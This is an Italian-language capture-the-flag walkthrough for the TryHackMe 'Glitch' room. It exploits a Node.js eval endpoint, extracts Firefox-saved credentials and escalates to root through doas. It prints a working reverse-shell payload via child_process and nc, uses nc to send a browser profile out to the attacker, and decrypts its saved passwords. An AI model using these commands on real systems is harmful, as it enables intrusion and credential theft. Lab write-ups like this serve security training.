

https://tryhackme.com/room/glitch

Sfida che mostra un'app web e una semplice escalation dei privilegi. Riesci a trovare il problema?

```
nmap -Pn -O -v -p- 10.10.115.166
```
```
PORT   STATE SERVICE
80/tcp open  http
```

```
gobuster dir -u http://10.10.115.166 -w /usr/share/wordlists/dirb/common.txt -t50
```

```
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 173] [--> /img/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/secret               (Status: 200) [Size: 724]
Progress: 4614 / 4615 (99.98%)

```

andiamo su l'indirizzo trovato
```
http://10.10.115.166/secret
```
abbiamo un'immagine sullo sfondo e nien'altro
ispezioniamo il codice sorgente

troviamo interessante
```
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
  </body>
```

Il codice  è un semplice script JavaScript che definisce una funzione chiamata `getAccess()`. Ecco cosa fa:

1. **Definizione della funzione**: La funzione `getAccess()` viene definita, ma non viene chiamata automaticamente. Deve essere invocata esplicitamente per eseguire il suo contenuto.
    
2. **Richiesta Fetch**: All'interno della funzione, viene utilizzato il metodo `fetch()` per inviare una richiesta HTTP a un endpoint API specificato (`/api/access`). Questo è un modo per recuperare dati da un server.
    
3. **Gestione della risposta**:
    
    - Quando la richiesta è completata, la risposta viene convertita in formato JSON tramite `response.json()`.
    - Una volta che i dati sono stati convertiti, vengono stampati nella console del browser utilizzando `console.log(response)`.

In sintesi, il codice invia una richiesta a un'API per ottenere dati e poi visualizza questi dati nella console. Per far funzionare il codice, la funzione `getAccess()` deve essere chiamata da qualche parte del codice, ad esempio, in risposta a un evento come un clic su un pulsante.

visto che non c'e nessun pulsante possiamo dalla console di sviluppatore del browser inviare un `getAccess()`

```
getAccess()
undefined

Object { token: "dGhpc19pc19ub3RfcmVhbA==" }
secret:27:21
```

`dGhpc19pc19ub3RfcmVhbA==` dovrebbe essere un base 64 decodifichiamolo con

https://cyberchef.org/

ed abbiamo la risposta alla prima domanda

Qual è il tuo token di accesso?
```
this_is_not_real
```

**ora che abbiamo il token di accesso inseriamo il valore nei Cookie**

aggiorniamo la pagina con F5

Visivamente non c'è niente degno di nota ispezioniamo quindi il codice sorgente

```
view-source:http://10.10.115.166/
```

```
    <section id="click-here-sec">
      <a href="[#](view-source:http://10.10.115.166/#)">click me.</a>
    </section>

    <script src="[js/script.js](view-source:http://10.10.115.166/js/script.js)"></script>
```
controlliamo questo script
```
(async function () {
  const container = document.getElementById('items');
  await fetch('/api/items')
    .then((response) => response.json())
    .then((response) => {
      response.sins.forEach((element) => {
        let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
        container.insertAdjacentHTML('beforeend', el);
      });
```

un'altra funzione, proviamola:

```
http://10.10.115.166/api/items
```
```
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

utilizziamo curl
```
curl http://10.10.115.166/api/items
```
```   
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

invece di GET facciamo una richiesta POST
```
curl -X POST http://10.10.115.166/api/items    
```
otteniamo
```
{"message":"there_is_a_glitch_in_the_matrix"}
```

non sappiamo con quali parametri possiamo chiamare

possiamo effettuare il fuzzing per vedere quali parametri possiamo utilizzare

```
gobuster fuzz -m POST -u http://10.10.115.166/api/items?FUZZ= test -w /usr/share/SecLists/Discovery/Web-Content/api/objects.txt
```

troviamo
```
curl -X POST http://10.10.115.166/api/items?cmd=test
```
```
┌──(root㉿kali)-[/home/kali]
└─# curl -X POST http://10.10.115.166/api/items?cmd=test
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>

```

 **nodejs** cerchiamo un exploit sul Web
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
c'è una funzione chiamata **eval** , proviamo un RCE per ottenere una reverse shell

mettiamoci in ascolto su un nuovo terminale
```
nc -lvnp 1234
```

```
curl -X POST http://10.10.115.166/api/items?cmd=require('child_process').exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.99.134 1234 >/tmp/f")
```

codifichiamo questaparte dell'url perchè se no no funziona 
```
('child_process').exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.99.134 1234 >/tmp/f")
```

```
curl -X POST http://10.10.115.166/api/items?cmd=require%28%27child_process%27%29.exec%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.14.99.134%201234%20%3E%2Ftmp%2Ff%22%29%0A%0A
```

ed otteniamo la reverse shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.115.166] 60242
/bin/sh: 0: can't access tty; job control turned off
$ whoami
user
$ ls -al
total 32
drwxr-xr-x   6 root root 4096 Jan  4  2021 .
drwxr-xr-x  15 root root 4096 Jan  4  2021 ..
-rw-r--r--   1 root root  352 Jan  4  2021 app.js
drwxr-xr-x   2 root root 4096 Jan  3  2021 middleware
drwxr-xr-x 161 root root 4096 Jan  4  2021 node_modules
-rw-r--r--   1 root root  317 Jan  3  2021 package.json
drwxr-xr-x   4 root root 4096 Jan 15  2021 public
drwxr-xr-x   2 root root 4096 Jan 15  2021 routes

```

stabilizziamo la shell
```
python -c "import pty;pty.spawn('/bin/bash')"
```

a caccia della prima flag
```
cd /
user@ubuntu:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
user@ubuntu:/$ cd home
cd home
user@ubuntu:/home$ ls
ls
user  v0id
user@ubuntu:/home$ cd user
cd user
user@ubuntu:~$ ls -al
ls -al
total 48
drwxr-xr-x   8 user user  4096 Jan 27  2021 .
drwxr-xr-x   4 root root  4096 Jan 15  2021 ..
lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4  2021 .cache
drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox
drwx------   3 user user  4096 Jan  4  2021 .gnupg
drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm
drwxrwxr-x   5 user user  4096 Aug 21 17:28 .pm2
drwx------   2 user user  4096 Jan 21  2021 .ssh
-rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
user@ubuntu:~$ cat user.txt
cat user.txt
THM{i_don't_know_why}
```
eccola!
```
THM{i_don't_know_why}
```

notiamo anche una cartella nascosta .firefox probabilmente contiene delle credenziali
```
ls -al
total 48
drwxr-xr-x   8 user user  4096 Jan 27  2021 .
drwxr-xr-x   4 root root  4096 Jan 15  2021 ..
lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4  2021 .cache
drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox
drwx------   3 user user  4096 Jan  4  2021 .gnupg
drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm
drwxrwxr-x   5 user user  4096 Aug 21 17:28 .pm2
drwx------   2 user user  4096 Jan 21  2021 .ssh
-rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
user@ubuntu:~$ nc
nc
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
          [-X proxy_pr
```

vediamo che possiamo utilizzare nc per trasferire la cartella sul nostro pc

comprimiamo la cartella sul server
```
tar -cvf firefox.tar .firefox/
```

ci mettiamo in ascolto su kali
```
nc -nlvp 4444 > firefox.tar
```

dal server inviamo il file a kali
```
nc -nv 10.14.99.134 4444 < firefox.tar
```

ora su kali  decomprimiamo la cartella
```
tar -xvf firefox.tar
```

```
┌──(root㉿kali)-[/home/…/Downloads/Laboratori/.firefox/b5w4643p.default-release]
└─# pwd              
/home/kali/Downloads/Laboratori/.firefox/b5w4643p.default-release
                                                                                                         
┌──(root㉿kali)-[/home/…/Downloads/Laboratori/.firefox/b5w4643p.default-release]
└─# ls    
addons.json                 favicons.sqlite        SecurityPreloadState.txt
addonStartup.json.lz4       formhistory.sqlite     security_state
AlternateServices.txt       handlers.json          sessionCheckpoints.json
bookmarkbackups             key4.db                sessionstore-backups
cert9.db                    lock                   sessionstore.jsonlz4
compatibility.ini           logins.json            shield-preference-experiments.json
containers.json             minidumps              SiteSecurityServiceState.txt
content-prefs.sqlite        permissions.sqlite     storage
cookies.sqlite              pkcs11.txt             storage.sqlite
crashes                     places.sqlite          times.json
datareporting               prefs.js               TRRBlacklist.txt
extension-preferences.json  protections.sqlite     webappsstore.sqlite
extensions                  saved-telemetry-pings  xulstore.json
extensions.json             search.json.mozlz4

```
possiamo utilizzare questa repo per trovare le password in firefox

```
git clone https://github.com/lclevy/firepwd.git
```
```
cd firepwd
```
```
pip install -r requirements.txt
```

Spostiamo i file delle credenziali

```
mv /home/kali/Downloads/Laboratori/.firefox/b5w4643p.default-release/key4.db .
```

```
mv /home/kali/Downloads/Laboratori/.firefox/b5w4643p.default-release/logins.json .
```

```
python3 firepwd.py
```
se ci sono errori 
```
python3 -m venv myenv
```

```
source myenv/bin/activate
```

```
pip install pycryptodome
```

```
pip install pyasn1
```

```
python3 firepwd.py
```

```
└─# python3 firepwd.py       
globalSalt: b'c6b3288fe32e9b2eaab7f9859afd603ee5438c7d'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'8c7d73f5f2d645e07003f796ac0c19d6c26030d3d9e48cd2e43df49e511ecdfb'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'c95b8f722c66d9291535c5665bbf'
       }
     }
   }
   OCTETSTRING b'da4d660c7d758158230f19e13496e7ff'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'50744376b2db2f70059462566bfd498cce21b0247cf805b35901a28cc0f00bf9'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'9a210cb9db56c03eb93caa9b274f'
       }
     }
   }
   OCTETSTRING b'8206e895f019224d14e23a592bfaa05d4a21835c3c02535e37aa05ca1e2f0cc5'
 }
clearText b'5edc75d601dc4f2c9e5b9bbc49e6432c85dc0dbcfd1c6b1c0808080808080808'
decrypting login/password pairs
  https://glitch.thm:b'v0id',b'love_the_void'

```

```
decrypting login/password pairs
  https://glitch.thm:b'v0id',b'love_the_void'
```

ora che abbiamo le credenziali passiamo all'user v0id
```
su v0id
Password: love_the_void

v0id@ubuntu:/var/web$ 
```
cerchiamo il modo per scalare i privilegi
```
sudo -l
```
```
find / -perm -4000 2>/dev/null
```

```
[sudo] password for v0id: sudo -l

Sorry, try again.
[sudo] password for v0id: love_the_void

Sorry, user v0id may not run sudo on ubuntu.
v0id@ubuntu:/var/web$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/doas
v0id@ubuntu:/var/web$ 

```

Abbiamo i diritti per usare doas, che è simile a sudo e consente di eseguire un comando come un altro utente
```
doas
```

```
v0id@ubuntu:/var/web$ doas
doas
usage: doas [-nSs] [-a style] [-C config] [-u user] command [args]
```

```
doas -u root id
```

```
v0id@ubuntu:/var/web$ doas -u root id
doas -u root id
Password: love_the_void

uid=0(root) gid=0(root) groups=0(root)
v0id@ubuntu:/var/web$ 

```

possiamo ottenere una shell di root
```
doas -u root /bin/bash
```

otteniamo la shell di root ed andiamo a caccia della flag di root
```
doas -u root /bin/bash
Password: love_the_void

root@ubuntu:/var/web# whoami
whoami
root
root@ubuntu:/var/web# cd /root
cd /root
root@ubuntu:~# ls -al
ls -al
total 28
drwx------  3 root root 4096 Jan 27  2021 .
drwxr-xr-x 24 root root 4096 Jan 27  2021 ..
lrwxrwxrwx  1 root root    9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jan 21  2021 .local
-rw-------  1 root root 1079 Jan 27  2021 .viminfo
-rwxr-xr-x  1 root root   80 Jan 27  2021 clean.sh
-rw-r--r--  1 root root   37 Jan  4  2021 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
THM{xxxxxxxxxxxx}

```
trovata!
```
THM{xxxxxxxxxxx}
```